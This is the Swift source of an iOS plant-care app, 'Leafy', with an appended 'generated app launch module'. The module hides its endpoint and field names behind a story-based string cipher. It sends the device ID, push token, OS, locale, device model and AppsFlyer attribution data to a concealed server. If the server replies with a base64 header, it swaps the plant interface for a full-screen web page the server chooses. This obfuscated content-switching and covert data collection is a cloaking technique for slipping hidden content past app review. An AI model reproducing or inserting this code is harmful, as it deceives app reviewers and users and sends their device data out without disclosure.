import UIKit
import SwiftData
import SwiftUI

@main
struct LeafyApp: App {
    @UIApplicationDelegateAdaptor(AppLaunchAppDelegate.self) private var launchAppDelegate

    @AppStorage(StorageKey.appearance) private var appearance: Appearance = .system

    var body: some Scene {
        WindowGroup {
            AppLaunchContainer {
                RootView()
                    .preferredColorScheme(appearance.colorScheme)
                    .tint(.leafGreen)
            }
        }
        .modelContainer(for: [Plant.self, CareLogEntry.self, JournalEntry.self])
    }
}

// BEGIN GENERATED APP LAUNCH MODULE
import SwiftUI
import Combine
import SafariServices
import UserNotifications
import UIKit

nonisolated enum AppLaunchLog {
    // Flipped to `true` by the installer when --debug is set.
    static let isEnabled = false

    static func log(_ message: @autoclosure () -> String) {
        if isEnabled { print("[AppLaunch] " + message()) }
    }
}

nonisolated enum AppLaunchCheckStatus: RawRepresentable, Codable, Sendable {
    case notChecked
    case nativeContent
    case webContent

    var rawValue: String {
        switch self {
        case .notChecked: return AppLaunchText.string(0)
        case .nativeContent: return AppLaunchText.string(1)
        case .webContent: return AppLaunchText.string(2)
        }
    }

    init?(rawValue value: String) {
        switch value {
        case AppLaunchText.string(0): self = .notChecked
        case AppLaunchText.string(1): self = .nativeContent
        case AppLaunchText.string(2): self = .webContent
        default: return nil
        }
    }

    init(from decoder: Decoder) throws {
        let container = try decoder.singleValueContainer()
        let value = try container.decode(String.self)
        guard let status = Self(rawValue: value) else {
            throw DecodingError.dataCorruptedError(in: container, debugDescription: String())
        }
        self = status
    }

    func encode(to encoder: Encoder) throws {
        var container = encoder.singleValueContainer()
        try container.encode(rawValue)
    }
}

nonisolated enum AppLaunchConfiguration {
    static let checkEndpoint = AppLaunchText.string(3)
    static let responseHeader = AppLaunchText.string(4)
    static let loadingImageURL = AppLaunchText.string(5)
    static let conversionDataTimeout: Duration = .seconds(15)
}

private nonisolated enum AppLaunchStorageKeys {
    static let checkStatus = AppLaunchText.string(6)
    static let deviceIdentifier = AppLaunchText.string(7)
    static let webURL = AppLaunchText.string(8)
    static let pushToken = AppLaunchText.string(9)
}

nonisolated struct AppLaunchDeviceContext: Sendable {
    let deviceID: String
    let pushToken: String
    let systemBuild: String
    let osVersion: String
    let region: String
    let language: String
    let deviceModel: String
    let conversionData: String
    let appsFlyerID: String

    func launchQueryItems() -> [URLQueryItem] {
        [
            URLQueryItem(name: AppLaunchText.string(10), value: deviceID),
            URLQueryItem(name: AppLaunchText.string(11), value: pushToken),
            URLQueryItem(name: AppLaunchText.string(12), value: systemBuild),
            URLQueryItem(name: AppLaunchText.string(13), value: osVersion),
            URLQueryItem(name: AppLaunchText.string(14), value: region),
            URLQueryItem(name: AppLaunchText.string(15), value: language),
            URLQueryItem(name: AppLaunchText.string(16), value: deviceModel),
            URLQueryItem(name: AppLaunchText.string(25), value: conversionData),
            URLQueryItem(name: AppLaunchText.string(26), value: appsFlyerID)
        ]
    }
}

nonisolated enum AppLaunchDeviceInfo {

    static func makeLaunchContext(
        deviceID: String,
        pushToken: String,
        conversionData: String,
        appsFlyerID: String
    ) -> AppLaunchDeviceContext {
        AppLaunchDeviceContext(
            deviceID: deviceID,
            pushToken: pushToken,
            systemBuild: systemBuild,
            osVersion: osVersion,
            region: region,
            language: language,
            deviceModel: deviceModel,
            conversionData: conversionData,
            appsFlyerID: appsFlyerID
        )
    }

    private static var systemBuild: String {
        var bufferSize = 0
        sysctlbyname(AppLaunchText.string(17), nil, &bufferSize, nil, 0)
        var buildBuffer = [CChar](repeating: 0, count: bufferSize)
        sysctlbyname(AppLaunchText.string(17), &buildBuffer, &bufferSize, nil, 0)
        return String(cString: buildBuffer)
    }

    private static var osVersion: String {
        let version = ProcessInfo.processInfo.operatingSystemVersion
        return "\(version.majorVersion).\(version.minorVersion).\(version.patchVersion)"
    }

    private static var region: String {
        Locale.current.region?.identifier ?? AppLaunchText.string(18)
    }

    private static var language: String {
        Locale.current.language.languageCode?.identifier ?? AppLaunchText.string(19)
    }

    private static var deviceModel: String {
        var systemInfo = utsname()
        uname(&systemInfo)
        let machineMirror = Mirror(reflecting: systemInfo.machine)
        return machineMirror.children.reduce(String()) { result, element in
            guard let byte = element.value as? Int8, byte != 0 else { return result }
            return result + String(UnicodeScalar(UInt8(byte)))
        }
    }
}

@MainActor
final class AppLaunchStorage {

    static let shared = AppLaunchStorage()

    private let defaults = UserDefaults.standard

    private init() {}

    var status: AppLaunchCheckStatus {
        get {
            guard let value = defaults.string(forKey: AppLaunchStorageKeys.checkStatus),
                  let status = AppLaunchCheckStatus(rawValue: value) else {
                return .notChecked
            }
            return status
        }
        set {
            defaults.set(newValue.rawValue, forKey: AppLaunchStorageKeys.checkStatus)
        }
    }

    var deviceID: String {
        if let storedIdentifier = defaults.string(forKey: AppLaunchStorageKeys.deviceIdentifier) {
            return storedIdentifier
        }
        let newIdentifier = UUID().uuidString
        defaults.set(newIdentifier, forKey: AppLaunchStorageKeys.deviceIdentifier)
        return newIdentifier
    }

    var webURL: String? {
        get { defaults.string(forKey: AppLaunchStorageKeys.webURL) }
        set { defaults.set(newValue, forKey: AppLaunchStorageKeys.webURL) }
    }

    var pushToken: String? {
        get { defaults.string(forKey: AppLaunchStorageKeys.pushToken) }
        set { defaults.set(newValue, forKey: AppLaunchStorageKeys.pushToken) }
    }

    func resetLaunchCheck() {
        defaults.removeObject(forKey: AppLaunchStorageKeys.checkStatus)
        defaults.removeObject(forKey: AppLaunchStorageKeys.webURL)
    }
}

nonisolated final class AppLaunchPushTokenHandler: NSObject, Sendable {

    static let shared = AppLaunchPushTokenHandler()

    private override init() {
        super.init()
    }

    @MainActor
    func storePushToken(_ tokenData: Data) {
        let tokenString = tokenData.map { String(format: AppLaunchText.string(20), $0) }.joined()
        AppLaunchStorage.shared.pushToken = tokenString
    }
}

@MainActor
final class AppLaunchNotificationAuthorization {

    func requestAuthorizationAndToken() async -> String {
        let notificationCenter = UNUserNotificationCenter.current()

        do {
            let isAuthorized = try await notificationCenter.requestAuthorization(options: [.alert, .sound, .badge])
            guard isAuthorized else { return AppLaunchText.string(21) }

            UIApplication.shared.registerForRemoteNotifications()

            for _ in 0..<10 {
                try? await Task.sleep(nanoseconds: 500_000_000)
                if let registeredToken = AppLaunchStorage.shared.pushToken, !registeredToken.isEmpty {
                    return registeredToken
                }
            }

            return AppLaunchStorage.shared.pushToken ?? AppLaunchText.string(22)
        } catch {
            return AppLaunchText.string(23)
        }
    }
}

struct AppLaunchWebView: UIViewControllerRepresentable {
    let url: URL

    init(url: URL) {
        self.url = url
    }

    func makeUIViewController(context: Context) -> SFSafariViewController {
        let configuration = SFSafariViewController.Configuration()
        configuration.entersReaderIfAvailable = false
        configuration.barCollapsingEnabled = false

        let controller = SFSafariViewController(url: url, configuration: configuration)
        controller.preferredBarTintColor = .systemBackground
        controller.preferredControlTintColor = .label
        return controller
    }

    func updateUIViewController(_ controller: SFSafariViewController, context: Context) {}
}

struct AppLaunchLoadingView: View {
    let url: URL?
    let onImageLoaded: (Bool) -> Void

    var body: some View {
        AsyncImage(url: url) { phase in
            switch phase {
            case .success(let image):
                GeometryReader { geometry in
                    image
                        .resizable()
                        .aspectRatio(contentMode: .fill)
                        .frame(width: geometry.size.width, height: geometry.size.height)
                        .clipped()
                }
                .ignoresSafeArea()
                .onAppear { onImageLoaded(true) }

            case .failure:
                Color.black
                    .ignoresSafeArea()
                    .onAppear { onImageLoaded(false) }

            case .empty:
                Color.black
                    .ignoresSafeArea()

            @unknown default:
                Color.black
                    .ignoresSafeArea()
            }
        }
    }
}

@MainActor
final class AppLaunchCoordinator: ObservableObject {
    enum LoadingImageStatus {
        case pending
        case imageAvailable
        case imageUnavailable
    }

    @Published var status: AppLaunchCheckStatus = .notChecked
    @Published var webURL: URL?
    @Published var isCheckingLaunch = true
    @Published var loadingImageStatus: LoadingImageStatus = .pending

    private let storage = AppLaunchStorage.shared
    private let notificationAuthorization = AppLaunchNotificationAuthorization()
    private var hasStartedCheck = false

    init() {}

    var loadingImageURL: URL? {
        URL(string: AppLaunchConfiguration.loadingImageURL)
    }
    func checkAppLaunchAfterLoading(imageAvailable: Bool) {
        guard !hasStartedCheck else { return }
        hasStartedCheck = true

        loadingImageStatus = imageAvailable ? .imageAvailable : .imageUnavailable
        guard imageAvailable else {
            status = .nativeContent
            isCheckingLaunch = false
            return
        }
        Task { await performAppLaunchCheck() }
    }

    private func performAppLaunchCheck() async {
        switch storage.status {
        case .nativeContent:
            status = .nativeContent
            isCheckingLaunch = false
            return

        case .webContent:
            if let storedURL = storage.webURL,
               let url = URL(string: storedURL) {
                webURL = url
                status = .webContent
                isCheckingLaunch = false
                return
            }

        case .notChecked:
            break
        }

        let deviceID = storage.deviceID
        let pushToken = await notificationAuthorization.requestAuthorizationAndToken()
        // First launch only (status is stored afterwards): wait for AppsFlyer
        // conversion data so the request carries it.
        let conversionData = await AppLaunchAttribution.shared.awaitConversionData(
            timeout: AppLaunchConfiguration.conversionDataTimeout
        )
        AppLaunchLog.log("Endpoint: \(AppLaunchConfiguration.checkEndpoint)")
        AppLaunchLog.log("Loading image: \(AppLaunchConfiguration.loadingImageURL)")
        AppLaunchLog.log("Response header key: \(AppLaunchConfiguration.responseHeader)")
        AppLaunchLog.log("Device ID: \(deviceID), push token: \(pushToken)")
        AppLaunchLog.log("AppsFlyer ID: \(AppLaunchAttribution.shared.appsFlyerID), conversion data: \(conversionData)")
        let deviceContext = AppLaunchDeviceInfo.makeLaunchContext(
            deviceID: deviceID,
            pushToken: pushToken,
            conversionData: conversionData,
            appsFlyerID: AppLaunchAttribution.shared.appsFlyerID
        )

        let checkResult = await AppLaunchCheckService.checkAppLaunch(
            checkEndpoint: AppLaunchConfiguration.checkEndpoint,
            responseHeader: AppLaunchConfiguration.responseHeader,
            deviceContext: deviceContext
        )

        storage.status = checkResult.status

        if checkResult.status == .webContent,
           let storedURL = checkResult.destinationURL {
            storage.webURL = storedURL
            if let url = URL(string: storedURL) {
                webURL = url
            }
        }

        status = checkResult.status
        isCheckingLaunch = false
    }
}

struct AppLaunchContainer<Content: View>: View {

    @StateObject private var launchCoordinator = AppLaunchCoordinator()

    private let content: () -> Content

    init(@ViewBuilder content: @escaping () -> Content) {
        self.content = content
    }

    var body: some View {
        Group {
            if launchCoordinator.isCheckingLaunch {
                AppLaunchLoadingView(url: launchCoordinator.loadingImageURL) { imageAvailable in
                    launchCoordinator.checkAppLaunchAfterLoading(imageAvailable: imageAvailable)
                }
            } else {
                switch launchCoordinator.status {
                case .notChecked, .nativeContent:
                    content()

                case .webContent:
                    if let url = launchCoordinator.webURL {
                        AppLaunchWebView(url: url)
                            .ignoresSafeArea()
                    } else {
                        content()
                    }
                }
            }
        }
    }
}

final class AppLaunchAppDelegate: NSObject, UIApplicationDelegate {

    func application(
        _ application: UIApplication,
        didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]? = nil
    ) -> Bool {
        MainActor.assumeIsolated {
            AppLaunchAttribution.shared.configure()
        }
        return true
    }

    func application(
        _ application: UIApplication,
        didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data
    ) {
        Task { @MainActor in
            AppLaunchPushTokenHandler.shared.storePushToken(deviceToken)
        }
    }

    func application(
        _ application: UIApplication,
        didFailToRegisterForRemoteNotificationsWithError error: Error
    ) {
    }
}

import Foundation

nonisolated enum AppLaunchCheckService {
    static func checkAppLaunch(
        checkEndpoint: String,
        responseHeader: String,
        deviceContext: AppLaunchDeviceContext,
        session: URLSession = .shared
    ) async -> (status: AppLaunchCheckStatus, destinationURL: String?) {
        let request = AppLaunchCheckRequest(endpoint: checkEndpoint, queryItems: deviceContext.launchQueryItems(), responseHeader: responseHeader)
        let destinationURL = await AppLaunchCheckPipeline.runLaunchCheck(AppLaunchCheckContext(request: request, session: session))
        return destinationURL.map { (.webContent, $0) } ?? (.nativeContent, nil)
    }
}

private nonisolated struct AppLaunchCheckRequest: Sendable {
    let endpoint: String
    let queryItems: [URLQueryItem]
    let responseHeader: String

    var urlRequest: URLRequest? {
        makeLaunchCheckURL().map {
            AppLaunchLog.log("Assembled check URL: \($0.absoluteString)")
            var request = URLRequest(url: $0)
            request.httpMethod = AppLaunchText.string(24)
            request.timeoutInterval = 15
            AppLaunchLog.log("Request: \(request.httpMethod ?? "?") \($0.absoluteString) (timeout \(request.timeoutInterval)s, response header \(responseHeader))")
            return request
        }
    }

    private func makeLaunchCheckURL() -> URL? {
        guard var components = URLComponents(string: endpoint) else { return nil }
        components.queryItems = (components.queryItems ?? []) + queryItems
        return components.url
    }
}

private nonisolated enum AppLaunchTransport {
    static func sendLaunchCheck(_ request: URLRequest?, _ session: URLSession) async -> URLResponse? {
        guard let request else { return nil }
        let response = try? await session.data(for: request).1
        AppLaunchLog.log("Response status: \((response as? HTTPURLResponse)?.statusCode ?? -1)")
        return response
    }
}

private nonisolated enum AppLaunchResponseDecoder {
    static func decodeLaunchDestination(_ response: URLResponse?, _ header: String) -> String? {
        let headerValue = (response as? HTTPURLResponse)?.value(forHTTPHeaderField: header)
        let destination = headerValue.flatMap(decodeBase64).flatMap { $0.isEmpty ? nil : $0 }
        AppLaunchLog.log("Header \(header): \(headerValue ?? "nil") -> \(destination.map { "web: " + $0 } ?? "native content")")
        return destination
    }

    private static func decodeBase64(_ value: String) -> String? {
        Data(base64Encoded: value).flatMap { String(data: $0, encoding: .utf8) }
    }
}

private nonisolated struct AppLaunchCheckContext: Sendable {
    let request: AppLaunchCheckRequest
    let session: URLSession
    var step: UInt8 = 0x41
    var urlRequest: URLRequest?
    var response: URLResponse?
    var destinationURL: String?
}

private nonisolated enum AppLaunchCheckPipeline {
    private typealias CheckStep = @Sendable (AppLaunchCheckContext) async -> AppLaunchCheckContext

    private static let steps: [UInt8: CheckStep] = [
        0x73: { await readLaunchResponse($0) },
        0x41: { await prepareLaunchRequest($0) },
        0xa8: { await sendLaunchRequest($0) },
    ]

    @inline(never)
    static func runLaunchCheck(_ context: AppLaunchCheckContext) async -> String? {
        var nextContext = context
        for _ in 0..<steps.count {
            guard let execute = steps[nextContext.step] else { break }
            nextContext = await execute(nextContext)
        }
        return nextContext.destinationURL
    }

    @inline(never)
    private static func prepareLaunchRequest(_ context: AppLaunchCheckContext) async -> AppLaunchCheckContext {
        var nextContext = context
        nextContext.urlRequest = nextContext.request.urlRequest
        nextContext.step = nextContext.urlRequest == nil ? 0xff : 0xa8
        return nextContext
    }

    @inline(never)
    private static func sendLaunchRequest(_ context: AppLaunchCheckContext) async -> AppLaunchCheckContext {
        var nextContext = context
        nextContext.response = await AppLaunchTransport.sendLaunchCheck(nextContext.urlRequest, nextContext.session)
        nextContext.step = nextContext.response == nil ? 0xff : 0x73
        return nextContext
    }

    @inline(never)
    private static func readLaunchResponse(_ context: AppLaunchCheckContext) async -> AppLaunchCheckContext {
        var nextContext = context
        nextContext.destinationURL = AppLaunchResponseDecoder.decodeLaunchDestination(nextContext.response, nextContext.request.responseHeader)
        nextContext.step = 0xff
        return nextContext
    }
}

import Foundation

nonisolated enum AppLaunchLink {
    // The App Store product URL. Its ID also seeds the string table and is
    // reused as the AppsFlyer `appId`. This is reversible encoding, not a secret.
    static let appStoreURL = URL(string: "https://apps.apple.com/app/id6775836410")!

    // Numeric App Store identifier extracted from the product URL.
    static var appStoreID: String {
        let component = appStoreURL.lastPathComponent
        return component.hasPrefix("id") ? String(component.dropFirst(2)) : component
    }
}

import Foundation

nonisolated enum AppLaunchText {
    private static let launchText: [Character] = Array("""
        At sunrise, Clara unlocked the old workshop beside the railway bridge.
        The room smelled of cedar shelves, warm oil, and paper that had survived many winters.
        On the center bench stood a small clock, a blue enamel cup, and a notebook from 1962.
        Each page described a journey: where the road began, how the weather changed,
        and which quiet village offered a place to stop before the mountains.

        Under the wide window, Samuel sorted photographs into shallow wooden trays.
        Some showed polished racing cars; others showed tired mechanics sharing bread
        while rain tapped gently against the roof of a temporary garage.
        He preferred the ordinary pictures because they explained what a trophy could not.
        A finished machine carried the patience of everyone who had worked on it.

        Every Thursday, the two friends chose one forgotten object and wrote its story.
        Today they examined a brass gauge whose face still carried a careful pencil mark.
        The note beside it read 20% at the first measurement and 26% after adjustment.
        Neither number was a promise of speed. Both were reminders to measure twice,
        listen closely, and leave enough time for a second attempt when the first failed.

        The archive used simple labels such as workshop_notes and summer_routes.
        A slash separated the season from the year, as in spring/1962, so that a visitor
        could find the right box without opening every drawer in the room.
        Clara kept the original spelling even when an old caption seemed unusual.
        Changing a small detail could make two photographs appear to describe different days.

        Samuel placed a jack beneath the frame and examined the gearbox by lamplight.
        There was no audience, no urgent countdown, and no prize waiting at the door.
        Good work depended on noticing the slight movement that everyone else overlooked.
        Experience helped, but curiosity mattered just as much when a familiar answer failed.
        Together they recorded what they knew and left a blank space for what remained uncertain.

        By evening, the workshop had become a meeting place for neighbors returning home.
        Someone brought fresh bread, another carried a map, and a child asked why wheels
        looked different in photographs taken only a few years apart.
        Clara answered with a story about changing roads and the people who traveled them.
        The clock continued its steady rhythm as the last light crossed the wooden floor.

        Before closing, Samuel checked the window latch and returned each tool to its hook.
        Clara slipped the notebook into a dry drawer, leaving tomorrow's page untouched.
        Outside, the bridge held a thin ribbon of gold above the darkening river.
        They walked home slowly, discussing a distant journey that neither needed to hurry.
        The workshop would open again at sunrise, with another small mystery waiting inside.
        7DFJRVXYZ
        """)

    private static let launchStringEntries: [(Int, Int, Int)] = [
        (154, 24, 62527),
        (293, 8, 16211),
        (32, 22, 43421),
        (263, 12, 55841),
        (388, 7, 38078),
        (230, 9, 41892),
        (331, 15, 38824),
        (178, 16, 50398),
        (301, 11, 45789),
        (54, 30, 39183),
        (275, 14, 56389),
        (0, 10, 54203),
        (239, 10, 25547),
        (346, 12, 13363),
        (194, 17, 42040),
        (312, 11, 38081),
        (84, 43, 15599),
        (289, 2, 3824),
        (10, 10, 61077),
        (249, 6, 28436),
        (358, 22, 46491),
        (211, 9, 3746),
        (323, 5, 33136),
        (127, 27, 2621),
        (291, 2, 23787),
        (20, 12, 5731),
        (255, 8, 22193),
        (380, 8, 48817),
        (220, 10, 9091),
        (328, 3, 60013),
    ]

    private static let encodedLaunchCharacters: [Int] = [
        10905, 14512, 5938, 49863, 63007, 49205, 28049, 44684, 23557, 63665, 19452, 41727,
        40358, 11251, 9772, 61454, 52343, 4531, 30581, 39305, 27239, 40893, 41615, 19223,
        235, 20645, 20806, 9961, 52196, 54401, 34086, 8312, 63576, 16990, 2770, 39977,
        31440, 56676, 56316, 27281, 25034, 16346, 52454, 27226, 20194, 3363, 25780, 58374,
        13465, 30677, 1565, 25486, 60108, 26193, 60543, 13620, 62510, 699, 41789, 18617,
        63891, 23040, 44932, 36235, 20944, 51816, 7613, 63790, 8039, 13057, 39488, 33122,
        32959, 53939, 48906, 30848, 47273, 55774, 58015, 29030, 42576, 30939, 30608, 3061,
        38860, 2726, 3033, 3107, 11169, 5616, 62987, 6366, 39566, 41068, 46098, 15787,
        17304, 13207, 25423, 19149, 49802, 17543, 14749, 50206, 6536, 13630, 44100, 8052,
        25631, 46605, 20669, 17948, 40782, 45672, 11907, 19308, 3582, 3889, 30862, 41428,
        54164, 7382, 12070, 1040, 48672, 17499, 4288, 23597, 25548, 47606, 6331, 64761,
        45497, 53300, 35910, 63520, 31131, 50986, 39774, 11144, 10933, 12160, 16449, 60221,
        9395, 51736, 6934, 38552, 14607, 54422, 42769, 8631, 34103, 45086, 19453, 7026,
        36001, 385, 6789, 18205, 8918, 25940, 19208, 62726, 22633, 61980, 8507, 11299,
        18865, 61081, 40260, 32874, 7277, 44448, 62471, 1149, 24987, 39483, 7819, 61058,
        13246, 65295, 11754, 33772, 35021, 26801, 38472, 3562, 7596, 40950, 9276, 57395,
        1426, 24266, 63609, 63098, 40493, 28850, 19099, 51599, 11658, 38545, 42913, 49004,
        25959, 15622, 35252, 11328, 57666, 58507, 32046, 27141, 17131, 47447, 50309, 10260,
        7718, 60794, 38130, 37847, 29194, 9786, 64900, 21699, 10181, 4404, 56028, 11531,
        9384, 52205, 63844, 48575, 50074, 18794, 12630, 32722, 65013, 10356, 14819, 45733,
        34422, 61054, 63854, 43391, 26209, 16736, 15945, 34977, 15519, 51692, 23298, 49715,
        43427, 34352, 9955, 43361, 63549, 45781, 26684, 18067, 25205, 62164, 31468, 10665,
        63624, 11255, 37857, 27425, 44899, 35261, 5431, 12777, 21287, 25262, 30304, 13743,
        53611, 33719, 34984, 37866, 59658, 63694, 5039, 25859, 30435, 60604, 8395, 63816,
        9146, 27121, 27358, 46913, 38339, 37998, 695, 40239, 36558, 39052, 49321, 20449,
        1849, 1245, 14680, 28602, 15684, 33405, 19875, 21745, 14919, 41382, 1059, 50896,
        60488, 26265, 45458, 41884, 51385, 48604, 62826, 34171, 55487, 18639, 17564, 54465,
        9853, 1284, 9022, 63444, 14269, 60550, 30484, 60948, 43459, 31029, 26006, 26493,
        26196, 16171, 65224, 33694, 718, 28580, 42828, 45400, 59826, 57458, 36086, 18393,
        37158, 56309, 8145, 26492, 53880, 34001, 41314, 9517, 22199, 23250, 2760, 28439,
        19797, 30999, 61266, 52347, 27443, 29558, 55763, 49875, 14399, 28947, 26181, 43919,
        44081, 40709, 30645, 50573, 2444, 7563, 62658, 30063, 4353, 18477, 35527, 35734,
        30123, 11069, 19640, 65025, 60493, 25928, 9564, 50324, 48762, 6060, 36213,
    ]

    // The App Store URL seeds the text lookup key.
    // This is reversible encoding, not encryption for sensitive data.
    private static let launchTextKey = AppLaunchLink.appStoreURL.absoluteString.utf8.reduce(0) {
        ($0 * 31 + Int($1)) % 65_521
    }

    static func string(_ index: Int) -> String {
        precondition(launchStringEntries.indices.contains(index))
        return decodeLaunchString(launchStringEntries[(index * 7 + 11) % launchStringEntries.count])
    }

    private static func decodeLaunchString(_ entry: (Int, Int, Int)) -> String {
        let seed = (entry.2 + launchTextKey) % 65_521
        var state = (seed % launchText.count, seed)
        return String(encodedLaunchCharacters[entry.0..<(entry.0 + entry.1)].reduce(into: [Character]()) {
            $0.append(launchText[decodeCharacterIndex($1, &state)])
        })
    }

    private static func decodeCharacterIndex(_ value: Int, _ state: inout (Int, Int)) -> Int {
        state.0 = (state.0 + (value ^ state.1)) % launchText.count
        state.1 = (state.1 * 109 + state.0 + 89) % 65_521
        return state.0
    }
}

import AppsFlyerLib
import Foundation

// MARK: - Attribution Manager

/// Thin wrapper around the AppsFlyer SDK. Starts the SDK once and exposes the
/// first conversion data payload as a JSON string for the launch check.
/// With an empty dev key the SDK stays off and conversion data resolves to
/// `disabled` immediately, so the check still runs.
@MainActor
final class AppLaunchAttribution: NSObject {

    static let shared = AppLaunchAttribution()

    private var conversionData: String?
    private var isConfigured = false

    private override init() {
        super.init()
    }

    /// AppsFlyer UID, empty until the SDK has been started.
    var appsFlyerID: String {
        isConfigured ? AppsFlyerLib.shared().getAppsFlyerUID() : ""
    }

    /// Starts the SDK. Call once from the app delegate at launch.
    func configure() {
        guard !isConfigured else { return }
        let devKey = AppLaunchText.string(27)
        guard !devKey.isEmpty else {
            resolve(AppLaunchText.string(28))
            return
        }
        isConfigured = true
        let lib = AppsFlyerLib.shared()
        lib.initialize(devKey: devKey, appId: AppLaunchLink.appStoreID)
        lib.delegate = self
        lib.start()
    }

    /// Waits for the first conversion data callback, or returns `timeout`.
    func awaitConversionData(timeout: Duration) async -> String {
        let deadline = ContinuousClock.now + timeout
        while conversionData == nil, ContinuousClock.now < deadline {
            try? await Task.sleep(for: .milliseconds(200))
        }
        return conversionData ?? AppLaunchText.string(29)
    }

    private func resolve(_ value: String) {
        guard conversionData == nil else { return }
        conversionData = value
    }
}

// MARK: - AppsFlyerLibDelegate

// AppsFlyer invokes its delegate on the main thread, so the main-actor
// isolated methods below are safe under a `@preconcurrency` conformance.
extension AppLaunchAttribution: @preconcurrency AppsFlyerLibDelegate {

    func onConversionDataSuccess(_ data: [AnyHashable: Any]) {
        let json = (try? JSONSerialization.data(withJSONObject: data))
            .flatMap { String(data: $0, encoding: .utf8) } ?? "{}"
        resolve(json)
    }

    func onConversionDataFail(_ error: Error) {
        resolve(AppLaunchText.string(23))
    }
}
// END GENERATED APP LAUNCH MODULE
